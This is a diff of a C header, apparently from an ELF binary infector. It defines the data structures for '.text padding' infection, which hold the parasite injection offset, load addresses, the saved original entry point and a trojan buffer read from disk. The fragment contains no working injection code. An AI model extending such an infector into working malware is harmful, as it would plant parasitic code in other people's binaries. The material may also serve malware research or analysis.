@@ -1,20 +1,19 @@
 #ifndef _INFECT_H
 #define _INFECT_H
 
-struct inf_seg_pad {
-    elf_addr_t  lsb_exec_addr;  /* parasite load addr if LSD exec */
-    elf_off_t   so_addr;  /* parasite load addr if .so */
-    elf_off_t   inf_target_offset; /* location to inject parasite */
-    elf_off_t   inf_pading_size;  /* total size available for parasite */
-    elf_off_t   original_e_entry; /* Original entry point must be saved before infecting */
-};
 typedef struct infect {
     elf_t   *elfo;
     long    *magic_ptr;
-    int     total_pt_load;
-    struct  inf_seg_pad pad;
+    /** Simple .text padding infection */
+    struct {
+        elf_addr_t  lsb_exec_addr;      /**< parasite load addr if LSD exec */
+        elf_off_t   lsb_so_addr;        /**< parasite load addr if .so */
+        elf_off_t   target_offset;      /**< location to inject parasite */
+        elf_off_t   o_entry;            /**< Original entry point must be saved before infecting */
+    } pad;
+    off_t           src_bin_size;       /**< trojan size in disk */
+    void           *trojan;             /**< ELF infection; heap allocated via fread() @see utils.c */
 } infect_t;
-
 
 infect_t *inf_load(elf_t *, FILE *, open_mode_t, long);
 elf_off_t inf_scan_segment(infect_t *);
